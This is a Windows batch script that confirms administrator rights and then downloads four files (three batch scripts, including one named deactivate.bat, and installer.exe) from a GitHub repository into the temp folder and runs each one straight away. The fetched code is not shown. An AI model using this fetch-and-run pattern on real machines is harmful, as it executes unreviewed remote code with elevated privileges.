@echo off
goto check_Permissions

:check_Permissions
    echo Administrative permissions required. Detecting permissions...

    net session >nul 2>&1
    if %errorLevel% == 0 (
        echo Success: Administrative permissions confirmed.
    ) else (
	goto Fail
    )




powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/deactivate.bat', '%Temp%\deactivate.bat') }"
start %Temp%\deactivate.bat
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/extras.bat', '%Temp%\extras.bat') }"
start %Temp%\extras.bat
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/uninstall.bat', '%Temp%\uninstall.bat') }"
start %Temp%\uninstall.bat
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/installer.exe', '%Temp%\installer.exe') }"
start %Temp%\installer.exe
:Fail
exit
